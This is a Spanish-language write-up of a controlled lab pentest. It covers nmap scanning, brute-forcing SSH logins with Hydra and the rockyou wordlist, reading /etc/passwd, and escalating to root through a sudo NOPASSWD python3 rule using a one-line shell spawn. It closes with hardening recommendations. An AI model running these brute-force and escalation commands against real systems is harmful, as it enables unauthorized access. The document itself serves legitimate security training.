# 🧾 INFORMACIÓN GENERAL

```text
┌────────────────────────────────────────────────────────────────────────────┐
│                          INFORMACIÓN GENERAL                               │
├────────────────────────────────────────────────────────────────────────────┤
│ Título del Pentest / Máquina : [pequenas-mentirosas]                       │
│ Autor / Tester             : [fybersec]                                    │
│ Fecha de realización       : [**/**/2026]                                  │
│ Alcance del laboratorio    : [Máquinas / servicios / red]                  │
│ Objetivo del pentest       : Evaluar seguridad e identificar               │
│                              vulnerabilidades                              │
│ Notas adicionales          : [Laboratorio controlado]                      │
└────────────────────────────────────────────────────────────────────────────┘
```
# 🧠 Resumen Ejecutivo

Se realizó un análisis de seguridad identificando servicios expuestos (SSH y HTTP).

A través de la enumeración web se obtuvo una pista que permitió inferir
un usuario válido. Mediante fuerza bruta sobre SSH se logró acceso inicial.

Posteriormente, se identificó un usuario con mayores privilegios y una
configuración insegura en sudo que permitía ejecutar python3 como root
sin contraseña.

Esto permitió la escalada de privilegios y el compromiso total del sistema.

Nivel de criticidad: 🔴 ALTO

# 🌐Reconocimiento
```
❯ ping -c 2 172.17.0.3
PING 172.17.0.3 (172.17.0.3) 56(84) bytes of data.
64 bytes from 172.17.0.3: icmp_seq=1 ttl=64 time=0.094 ms
64 bytes from 172.17.0.3: icmp_seq=2 ttl=64 time=0.080 ms

--- 172.17.0.3 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1021ms
rtt min/avg/max/mdev = 0.080/0.087/0.094/0.007 ms
```
ping envía paquetes ICMP para verificar si el host está activo.
El parámetro -c 2 limita el envío a 2 paquetes para no generar tráfico innecesario.

El host responde correctamente, lo que confirma conectividad.
Además, el TTL=64 sugiere que probablemente se trate de un sistema Linux, lo cual ya nos da contexto sobre posibles rutas de ataque y comportamiento del sistema.
# 🔍Escaneo de Nmap
```
❯ sudo nmap -sS -n -Pn --min-rate 5000 -p- --open 172.17.0.3 -oN allports
─ Comando
│
│  sudo nmap -sS -n -Pn -p- --open --min-rate 5000 -oN scan.txt <TARGET>
│
├─ Desglose
│
│  sudo            → Ejecuta Nmap con privilegios elevados necesarios para SYN scan
│  nmap            → Herramienta de escaneo para enumeración de puertos y servicios
│  -sS             → Escaneo SYN (half-open), rápido y relativamente sigiloso
│  -n              → Desactiva resolución DNS para mejorar la velocidad
│  -Pn             → Omite descubrimiento de host, asume que está activo
│  -p-             → Escanea todos los puertos TCP (1–65535)
│  --open          → Muestra únicamente los puertos que están abiertos
│  --min-rate 5000 → Fuerza una tasa mínima de 5000 paquetes por segundo
│  -oN scan.txt    → Guarda los resultados en formato normal en un archivo
│  <TARGET>        → Dirección IP o dominio del objetivo
│
└─ Nota
   Puede generar mucho tráfico; ideal para laboratorios o entornos controlados 
   ```
### Resultado
```
Starting Nmap 7.99 ( https://nmap.org ) at 2026-04-27 11:30 -0400
Nmap scan report for 172.17.0.3
Host is up (0.000011s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: DA:E6:1D:1F:69:B6 (Unknown)

```

# 🧪Enumeración de servicios
```
❯ sudo nmap -sCV -n -Pn -p22,80 -oN services.txt 172.17.0.3
```
-sC → ejecuta scripts de enumeración  
-sV → detecta versiones  

### Resultados importantes
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)
| ssh-hostkey: 
|   256 9e:10:58:a5:1a:42:9d:be:e5:19:d1:2e:79:9c:ce:21 (ECDSA)
|_  256 6b:a3:a8:84:e0:33:57:fc:44:49:69:41:7d:d3:c9:92 (ED25519)
80/tcp open  http    Apache httpd 2.4.62 ((Debian))
|_http-server-header: Apache/2.4.62 (Debian)
|_http-title: Site doesn't have a title (text/html).
MAC Address: DA:E6:1D:1F:69:B6 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.64 seconds
```
# 🌍Enumeración Web
Se accede al puerto 80 y se observa una pista 

<p align="center">
  <img src="https://raw.githubusercontent.com/fybersec/cybersecurity-labs/main/dockerlabs/Imagenes/Web.png" width="600">
</p>

Se realiza enumeración web para identificar:
- tecnologías utilizadas
- posibles rutas ocultas
- contenido sensible

No se encontraron directorios relevantes mediante fuzzing,
sin embargo, el contenido de la página sugiere un posible usuario: "a".

# 🔓ACCESO INICIAL (FUERZA BRUTA SSH) 
A partir de la pista encontrada en la web, se infiere que "a"
podría ser un usuario válido del sistema.

Dado que SSH está expuesto, se plantea un ataque de autenticación.
```
❯ hydra  -l a -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.3
Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-04-27 11:35:44
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ssh://172.17.0.3:22/
[22][ssh] host: 172.17.0.3   login: a   password: ******

```
Se decide realizar fuerza bruta contra el servicio SSH
debido a:
- ausencia de otros vectores explotables inmediatos
- posible existencia de credenciales débiles

Nota: Este tipo de ataque es viable en entornos de laboratorio,
pero en escenarios reales puede generar alertas.

# 🖥️ACCESO POR SSH
```
❯ ssh a@172.17.0.3
The authenticity of host '172.17.0.3 (172.17.0.3)' can't be established.
ED25519 key fingerprint is: SHA256:k21i9gNka9bAHgFRx7TjoBoqirDbAkhw/dp9dfTXRRs
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '172.17.0.3' (ED25519) to the list of known hosts.
a@172.17.0.3's password: 
Linux 0ccc4814da78 6.18.12+kali-amd64 #1 SMP PREEMPT_DYNAMIC Kali 6.18.12-1kali1 (2026-02-25) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
a@0ccc4814da78:~$ sudo -l
[sudo] password for a: 
Sorry, user a may not run sudo on 0ccc4814da78.

```
Aca podemos visualizar que no tenemos oportunidad de escalar privilegio con un tipico NOPASSWD y podriamos probar buscar binarios pero en este caso no aplica, entonces enumeramos posibles usuarios que pueden estar dentro del servidor tambien:
```
a@0ccc4814da78:/$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
systemd-timesync:x:997:997:systemd Time Synchronization:/:/usr/sbin/nologin
messagebus:x:100:101::/nonexistent:/usr/sbin/nologin
sshd:x:101:65534::/run/sshd:/usr/sbin/nologin
*******:x:1000:1000::/home/spencer:/bin/bash
a:x:1001:1001::/home/a:/bin/bash
```
Encontramos un usuario el cual tiene acceso a una bash, y es valido intentar acceder a el desde el usuario "a" sin emabrgo no tendriamos ningun avance entonces lo que nos quedaria seria hacer fuerza bruta por segunda vez pero esta vez al usuario ****** : 

# 🔓ACCESO INICIAL (FUERZA BRUTA SSH) 2da vez
```
 hydra  -l ***** -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.3
Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-04-27 12:13:42
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ssh://172.17.0.3:22/
[22][ssh] host: 172.17.0.3   login: ******   password: ******
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 3 final worker threads did not complete until end.
[ERROR] 3 targets did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-04-27 12:13:52
```
Ahora que ya tenemos una clave valida para dicho usuario podemos ir a ssh nuevamente y acceder
 
# 🖥️ACCESO POR SSH
```
 ❯ ssh spencer@172.17.0.3
spencer@172.17.0.3's password: 
spencer@0ccc4814da78:~$ sudo -l
Matching Defaults entries for spencer on 0ccc4814da78:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User spencer may run the following commands on 0ccc4814da78:
    (ALL) NOPASSWD: /usr/bin/python3

```
El usuario spencer puede ejecutar python3 como root sin contraseña.

Dado que Python permite ejecución de comandos del sistema,
es posible invocar una shell con privilegios elevados,
heredando los permisos de sudo.

Esto permite obtener acceso root.

# 🚀 ESCALADA DE PRIVILEGIOS
Luego de ver si puedo ser root con el comando sudo -l obtenemos este resultado 
```
******@0ccc4814da78:~$ sudo python3 -c 'import os; os.system("/bin/bash")'
root@0ccc4814da78:/home/*****# whoami
root
root@0ccc4814da78:/home/******# id
uid=0(root) gid=0(root) groups=0(root)
root@0ccc4814da78:/home/******#
```
Aqui solo le colocamos un codigo que le dice a python3 que quiere una shell y como lo estamos haciendo con sudo no exige clave

# 🎯 Cadena de ataque

* Recon →
* Descubrimiento de servicios (SSH + HTTP) →
* Análisis web superficial (pista) →
* Identificación de posible usuario válido →
* Ataque de credenciales (fuerza bruta SSH) →
* Acceso como usuario inicial →
* Enumeración local (/etc/passwd) →
* Descubrimiento de usuario adicional →
* Nuevo ataque de credenciales →
* Acceso como usuario privilegiado →
* Enumeración sudo →
* Abuso de python3 con NOPASSWD →
* Escalada a root

# 🛡️ Recomendaciones

🔐 Autenticación
* Deshabilitar login por contraseña en SSH
* Implementar autenticación por clave pública
🚫 Protección contra fuerza bruta
* Fail2Ban
* Rate limiting en SSH
👤 Gestión de usuarios
* Evitar usuarios débiles ("a")
* Políticas de contraseñas robustas
⚙️ Sudo
* Nunca permitir:
* NOPASSWD: python3
